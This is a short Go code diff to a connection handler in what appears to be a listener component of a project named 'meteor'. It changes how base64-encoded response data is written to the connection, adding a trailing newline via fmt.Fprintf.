@@ -2,6 +2,7 @@ package main
 
 import (
 	"encoding/base64"
+	"fmt"
 	lUtils "github.com/degenerat3/meteor/meteor/listeners/utils"
 	"github.com/degenerat3/meteor/meteor/pbuf"
 	"github.com/golang/protobuf/proto"
@@ -82,6 +83,6 @@ func connHandle(conn net.Conn) {
 		conn.Write([]byte(""))
 	}
 	encoded := base64.StdEncoding.EncodeToString(retData)
-	conn.Write([]byte(encoded))
+	fmt.Fprintf(conn, "%s\n", encoded)
 	return
 }
